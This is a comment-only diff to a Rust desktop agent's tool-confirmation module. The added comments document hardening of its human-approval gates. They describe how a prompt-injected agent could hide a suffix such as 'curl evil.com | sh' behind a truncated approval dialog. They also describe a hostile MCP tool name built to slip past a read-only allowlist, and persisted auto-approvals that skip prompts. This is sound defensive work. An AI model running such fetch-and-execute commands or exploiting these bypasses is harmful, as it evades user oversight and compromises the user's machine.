@@ -19,10 +19,33 @@ use tauri::{Emitter, Manager, State};
 use tokio::sync::oneshot;
 use tracing::{debug, info, warn};
 
+/// FIX-F6 (audit 2026-05-19): tools that MUST NEVER have a "remember this
+/// choice" persisted. Closes the Lies-in-the-Loop class bypass where a user
+/// once clicking "Approve and remember" on a privileged-transition prompt
+/// (or any high-blast destructive tool) would silently auto-approve every
+/// subsequent invocation across restarts, persisted in
+/// `remembered_tool_choices`. Migration v63 wipes any historical rows for
+/// these tools at startup; the runtime check in
+/// [`ToolConfirmationState::remember_choice`] rejects new writes, and
+/// [`ToolConfirmationState::get_remembered_choice`] ignores any row that
+/// survives, entries added after migration v63 shipped are only covered by
+/// that read-side filter, so it is the load-bearing one.
+///
+/// Migration v63's purge list covers the original (2026-05-19) entries; the
+/// `fix_f6_never_rememberable_alignment_tests` module records which entries
+/// are additionally covered read-side only.
+///
+/// The list also gates the two other standing grants, a session approval
+/// ([`ToolConfirmationState::is_session_approved`]) and `auto_approve_all`
+/// (see [`may_stand_on_a_prior_approval`]), so nothing a user clicked
+/// earlier, however wide, can answer for these tools.
 pub const NEVER_REMEMBERABLE: &[&str] = &[
+    // Privileged-mode transitions, flipping these silently is the
+    // canonical LITL bypass.
     "set_auto_approve_all",
     "set_agent_mode:autopilot",
     "set_tool_approval_policy",
+    // High-blast destructive primitives, should always prompt fresh.
     "execute_code",
     "code_execute",
     "file_write",
@@ -63,14 +86,45 @@ struct PendingConfirmation {
     request: Option<ToolConfirmationRequest>,
 }
 
+/// Returns `true` when `tool_name` is eligible to have a remembered choice
+/// persisted: not on [`NEVER_REMEMBERABLE`] and not an MCP tool.
+///
+/// MCP tools are excluded wholesale (audit 2026-08-08) because their blast
+/// radius is decided by a third-party server, not by this catalog, a
+/// remembered approval would follow the tool name even after the server
+/// redefines what it does. Standing MCP consent belongs in
+/// Settings → Connectors, which `enforce_mcp_connector_permission` reads.
 pub fn is_tool_remember_eligible(tool_name: &str) -> bool {
     !tool_name.starts_with("mcp__") && !NEVER_REMEMBERABLE.contains(&tool_name)
 }
 
+/// Returns `true` when an approval given earlier may answer for this call.
+///
+/// The three standing grants, a remembered choice, a session approval, and
+/// `auto_approve_all`, differ only in how long they last, so
+/// [`NEVER_REMEMBERABLE`] governs all three. `auto_approve_all` is the widest
+/// of them and it is not opt-in per tool: selecting Autopilot turns it on for
+/// everything (`setAgentMode` in the desktop settings store), which is how a
+/// tool whose entire behaviour is the argument the planner wrote this
+/// time, `browser_execute_async_js`, `db_execute`, `terminal_execute`, used
+/// to reach its sink with no prompt at all. Autopilot still skips the dialog
+/// for every other tool.
 pub fn may_stand_on_a_prior_approval(tool_name: &str) -> bool {
     is_tool_remember_eligible(tool_name)
 }
 
+/// `settings_v2` key used to persist [`ToolConfirmationState::agent_mode`]
+/// across app restarts.
+///
+/// FIX (DESKTOP-AGENTMODE-GUARDRAIL-SURFACE-01, audit 2026-07-03): prior to
+/// this fix `agent_mode` lived only in the in-memory `Arc<Mutex<AgentMode>>`
+/// and was never restored in `new_with_db`, so a user who explicitly set
+/// Safe or Plan mode (expecting that restriction to stick) had it silently
+/// reverted to the permissive `Build` default on every app relaunch, a real
+/// safety regression, not just a UX papercut. Stored via the same
+/// `settings_v2` table / `SettingCategory::Security` category used by the
+/// rest of the app's user-set security preferences (see
+/// `data::settings::service::SettingsService::save_app_settings`).
 const AGENT_MODE_SETTING_KEY: &str = "tool_confirmation.agent_mode";
 
 /// `settings_v2` key used to persist [`ToolConfirmationState::auto_approve_all`]
@@ -126,9 +180,13 @@ pub struct ToolConfirmationState {
     remembered_choices: Arc<Mutex<HashMap<String, bool>>>,
     /// Tool execution guard for policy lookups
     tool_guard: Arc<ToolExecutionGuard>,
+    /// Global auto-approve flag, when true, all tool confirmations are auto-approved
+    /// without showing the user a dialog. Equivalent to "God Mode" / trust-all.
     auto_approve_all: Arc<AtomicBool>,
     /// Current agent execution mode (Safe / Build / Autopilot)
     agent_mode: Arc<Mutex<AgentMode>>,
+    /// Session-scoped tool approvals, tools approved for the current session only.
+    /// Cleared when session ends or user explicitly resets.
     pub session_approved_tools: Arc<Mutex<HashSet<String>>>,
     /// Folder roots approved only for the current task/session.
     /// These never enter settings.json or the persistent MCP configuration.
@@ -153,6 +211,18 @@ impl ToolConfirmationState {
         }
     }
 
+    /// Create with SQLite persistence. Loads previously remembered choices,
+    /// the persisted agent mode, and the persisted auto-approve-all flag on
+    /// startup.
+    ///
+    /// FIX (DESKTOP-AGENTMODE-GUARDRAIL-SURFACE-01): `agent_mode` and
+    /// `auto_approve_all` are seeded to their safe, fail-closed defaults
+    /// (`AgentMode::Safe`, `false`) here rather than `AgentMode::default()`
+    /// (`Build`). [`Self::load_persisted_agent_settings`] overwrites these
+    /// with whatever the user last explicitly set, if anything was
+    /// persisted. If persistence is missing (genuine first run) or fails to
+    /// load (DB error / corrupt row), the safe seed values stand, the
+    /// runtime never silently falls back to a permissive mode.
     pub fn new_with_db(db_conn: Arc<StdMutex<Connection>>) -> Self {
         let state = Self {
             pending_confirmations: Arc::new(Mutex::new(HashMap::new())),
@@ -190,6 +260,8 @@ impl ToolConfirmationState {
                 );
             }
             None => {
+                // No persisted row, malformed value, or DB error, stay on
+                // the safe seed (`AgentMode::Safe`) set in `new_with_db`.
                 warn!("[ToolConfirmation] No valid persisted agent mode found; defaulting to Safe");
             }
         }
@@ -207,6 +279,8 @@ impl ToolConfirmationState {
                 );
             }
             None => {
+                // No persisted row / DB error, stay on the safe seed
+                // (`false`) set in `new_with_db`.
             }
         }
     }
@@ -308,6 +382,11 @@ impl ToolConfirmationState {
         self.auto_approve_all.load(Ordering::Relaxed)
     }
 
+    /// Set the current agent execution mode. Persisted to `settings_v2` so
+    /// the choice survives app restarts (FIX
+    /// DESKTOP-AGENTMODE-GUARDRAIL-SURFACE-01), a user who explicitly
+    /// selects Safe/Plan mode no longer has it silently reverted to Build
+    /// on the next launch.
     pub fn set_agent_mode(&self, mode: AgentMode) {
         {
             let mut lock = self.agent_mode.lock();
@@ -405,6 +484,9 @@ impl ToolConfirmationState {
         if server.is_empty() || tool.is_empty() {
             return None;
         }
+        // Reject ambiguous envelopes that smuggle additional `__` into
+        // either segment, they cannot be unambiguously routed back to a
+        // single server/tool pair.
         if server.contains("__") || tool.contains("__") {
             return None;
         }
@@ -673,6 +755,29 @@ impl Default for ToolConfirmationState {
     }
 }
 
+/// Summary of a tool confirmation request for the frontend.
+///
+/// FIX-F7 (audit 2026-05-19): began the Lies-in-the-Loop hardening. The
+/// legacy `parameters_summary` field truncates string values at 47 chars
+/// for the "compact" rendering, which let a prompt-injection-driven agent
+/// hide dangerous suffixes (e.g. `curl evil.com | sh`) past the visible
+/// scroll of the dialog. Two new fields are now populated alongside the
+/// legacy string:
+///
+/// - `args`, the full, untruncated `BTreeMap` of canonical parameters.
+///   Frontend consumers should prefer this over `parameters_summary` and
+///   render the entire value, with horizontal scroll if needed.
+/// - `summary_hash`, `sha256(canonical_json(args))` as lowercase hex.
+///   Provides an anti-tamper fingerprint the frontend can display so a
+///   forensic auditor can verify the dialog rendered the same args that
+///   were sent. Tampering by an XSS-compromised renderer would change
+///   the hash but the Rust-side log keeps the canonical version.
+///
+/// `parameters_summary` is preserved for one release for back-compat with
+/// the existing React rendering at
+/// `apps/desktop/src/components/UnifiedAgenticChat/Cards/ApprovalRequestCard.tsx`.
+/// The follow-up frontend change can switch to `args` + `summary_hash`
+/// rendering and remove the legacy field.
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct ToolConfirmationSummary {
     pub request_id: String,
@@ -895,6 +1000,15 @@ fn validated_folder_roots(request: &ToolConfirmationRequest) -> Result<Vec<Strin
     Ok(canonical_directories)
 }
 
+/// Respond to a tool confirmation request.
+/// Called by the frontend when user approves or denies a tool execution.
+///
+/// `remember_for_session`, when `true` and approved, the authoritative native
+/// request's tool is added to the session-scoped approval set so future
+/// invocations in this session skip the confirmation dialog.
+///
+/// `tool_name`, retained for IPC compatibility only. It is never trusted for
+/// authorization because the renderer may be compromised or stale.
 #[tauri::command]
 pub async fn respond_tool_confirmation(
     request_id: String,
@@ -1174,6 +1288,25 @@ pub fn get_allowed_directories(
     Ok(state.get_allowed_paths())
 }
 
+/// FIX (audit 2026-05-20, §4, Autopilot mode-transition integrity envelope):
+/// the legacy code passed the mode-transition payload as an ad-hoc
+/// `serde_json::json!({...})` literal. JSON object iteration order was a
+/// `serde_json::Map` (HashMap-backed in some builds), and the payload had no
+/// integrity envelope distinguishing the warning text from the boolean flag.
+/// An XSS-compromised renderer could keep the warning, swap the
+/// `new_auto_approve: true` for a deceptively rendered "false" string, and
+/// trick the user into clicking approve on a different transition than the
+/// one they think they're approving.
+///
+/// `ModeTransitionPayload` is a typed envelope with:
+///   * canonical field order (struct definition order, serde-preserved),
+///   * a `summary_hash` (sha256 of the canonicalized envelope sans the hash)
+///     mirroring the FIX-F7 anti-tamper pattern used on tool args,
+///   * a `kind` discriminator the frontend can pin to the dialog template.
+///
+/// The hash is intentionally over the envelope minus the hash field so the
+/// frontend can recompute and compare. Any mutation in transit / in the
+/// renderer between request and confirmation will mismatch.
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct ModeTransitionPayload {
     /// Discriminator: e.g. "auto_approve_all" or "agent_mode:autopilot".
@@ -1246,6 +1379,15 @@ impl ModeTransitionPayload {
     }
 }
 
+/// Enable or disable global auto-approve mode.
+/// When enabled, all tool confirmation dialogs are bypassed and every tool
+/// call is automatically approved. Use with caution.
+///
+/// DESK-AUTO-APPROVE-ALL (audit 2026-05-06): enabling this mode is at least
+/// as powerful as `set_agent_mode(Autopilot)`, it silently bypasses ALL
+/// confirmation dialogs with no per-tool granularity. Enabling requires the
+/// same user confirmation dialog used by the Autopilot mode transition.
+/// Disabling (de-escalation) never needs confirmation.
 #[tauri::command]
 pub async fn set_auto_approve_all(
     enabled: bool,
@@ -1522,8 +1664,10 @@ pub async fn request_tool_confirmation<R: tauri::Runtime>(
     let request_id = request.request_id.clone();
     let tool_name = request.tool_name.clone();
 
+    // Agent mode gate, block tools not permitted in the current mode
     enforce_agent_mode_gate(app_handle, state, &tool_name)?;
 
+    // Global auto-approve bypass, skip all dialogs when trust-all is enabled
     if state.is_auto_approve_all() && may_stand_on_a_prior_approval(&tool_name) {
         debug!(
             "[ToolConfirmation] Auto-approve-all active, skipping dialog for '{}'",
@@ -1616,6 +1760,12 @@ pub async fn request_tool_confirmation<R: tauri::Runtime>(
     }
 }
 
+/// Request confirmation for a user-initiated action, bypassing the agent-mode
+/// gate. Use this for configuration actions (e.g., MCP server connect from
+/// Settings) that should work regardless of the current agent mode.
+///
+/// Still respects auto-approve-all, remembered choices, and the 120-second
+/// confirmation dialog, just skips the Safe/Build/Autopilot mode check.
 pub async fn request_tool_confirmation_no_mode_gate(
     app_handle: &tauri::AppHandle,
     state: &ToolConfirmationState,
@@ -1800,6 +1950,11 @@ mod tests {
     fn test_tool_confirmation_state() {
         let state = ToolConfirmationState::new();
 
+        // FIX-F6 (audit 2026-05-19): the original fixture used "file_write"
+        // which is now on NEVER_REMEMBERABLE, `remember_choice` for those
+        // tools silently no-ops by design. Switched to "file_read" (safe,
+        // remember-eligible) to preserve the test's INTENT of verifying
+        // the persistence round-trip.
         assert!(state.get_remembered_choice("file_read").is_none());
         state.remember_choice("file_read", true);
         assert_eq!(state.get_remembered_choice("file_read"), Some(true));
@@ -2029,6 +2184,8 @@ mod tests {
         // Legacy field truncates (the LITL primitive)
         assert!(summary.parameters_summary.contains("..."));
 
+        // New field has the full value, the LITL primitive is closed
+        // for any consumer that reads `args` instead of `parameters_summary`.
         let arg_value = summary.args.get("command").expect("args has command");
         assert_eq!(arg_value.as_str(), Some(long_command.as_str()));
 
@@ -2039,6 +2196,10 @@ mod tests {
 
     #[test]
     fn confirmation_summary_hash_is_deterministic_across_map_order() {
+        // BTreeMap serialization is alphabetical so input order doesn't
+        // matter, but verify explicitly so any future change to the
+        // serialization path (e.g. switching to a different map type)
+        // catches the regression.
         let req1 = ToolConfirmationRequest {
             request_id: "r1".to_string(),
             tool_name: "t".to_string(),
@@ -2360,6 +2521,13 @@ mod tests {
     }
 }
 
+/// FIX (DESKTOP-AGENTMODE-GUARDRAIL-SURFACE-01, audit 2026-07-03): pins the
+/// restart-persistence fix for `agent_mode` / `auto_approve_all`. Prior to
+/// this fix both lived only in the in-memory `ToolConfirmationState` and
+/// were silently reset to their `Build` / `false` in-process defaults on
+/// every simulated "relaunch" (i.e. every fresh `ToolConfirmationState`
+/// constructed against the same on-disk DB), a user who explicitly chose
+/// Safe/Plan mode had that protection silently discarded.
 #[cfg(test)]
 mod agent_mode_persistence_tests {
     use super::*;
@@ -2425,6 +2593,11 @@ mod agent_mode_persistence_tests {
 
     #[test]
     fn explicit_autopilot_mode_survives_simulated_restart() {
+        // Autopilot is the most permissive mode, persistence must be
+        // symmetric (it doesn't only persist the "safe" choices), otherwise
+        // a user who legitimately wants Autopilot every session would be
+        // forced to re-select it (and re-click through the elevation
+        // confirmation dialog) on every launch.
         let db = migrated_db_conn();
 
         {
@@ -2525,6 +2698,10 @@ mod fix_f6_never_rememberable_alignment_tests {
         "browser_execute_in_frame",
     ];
 
+    /// The subset that migration v63 deletes from `remembered_tool_choices`
+    /// on upgrade. Entries outside this subset were added later, so an
+    /// already-migrated database can still hold a row for them, they rely
+    /// on the read-side filter in `get_remembered_choice`.
     const MIGRATION_V63_PURGED: &[&str] = &[
         "set_auto_approve_all",
         "set_agent_mode:autopilot",
@@ -2654,6 +2831,19 @@ mod fix_f6_never_rememberable_alignment_tests {
 
 #[cfg(test)]
 mod mcp_envelope_parser_tests {
+    //! FIX (audit 2026-05-20, §2/§13): pin the strict `mcp__<server>__<tool>`
+    //! envelope parser. The legacy code used `tool_name.ends_with(pattern)`
+    //! which lets a hostile MCP server publish e.g.
+    //! `mcp__evil__read_file_but_exfiltrate` and have it auto-approved in
+    //! Safe/Plan mode because the suffix "matches" the read_file allowlist.
+    //!
+    //! The fix is a two-step gate:
+    //!   1. `parse_mcp_envelope()` returns the trailing tool name *only* when
+    //!      the input is the exact canonical envelope (no embedded `__`,
+    //!      bounded length, canonical charset).
+    //!   2. `is_tool_permitted_for_mode()` then consults the exact-name
+    //!      `READ_ONLY_MCP_TOOLS` table, substring matches are no longer
+    //!      possible.
     use super::{AgentMode, ToolConfirmationState};
 
     #[test]
@@ -2719,6 +2909,8 @@ mod mcp_envelope_parser_tests {
 
     #[test]
     fn mcp_envelope_with_extra_separators_is_rejected() {
+        // Three segments after `mcp__` is ambiguous, could be smuggling
+        // a `__` to confuse downstream routing. Must reject.
         assert!(!ToolConfirmationState::is_tool_permitted_for_mode(
             "mcp__server__sub__read_file",
             AgentMode::Plan,
@@ -2757,6 +2949,8 @@ mod mcp_envelope_parser_tests {
 
     #[test]
     fn build_and_autopilot_modes_still_permit_everything() {
+        // The MCP-envelope gate is Safe/Plan-only, Build and Autopilot
+        // permit anything (confirmation gating handled separately).
         for tool in &[
             "mcp__evil__read_file_but_exfiltrate",
             "mcp__filesystem__write_file",
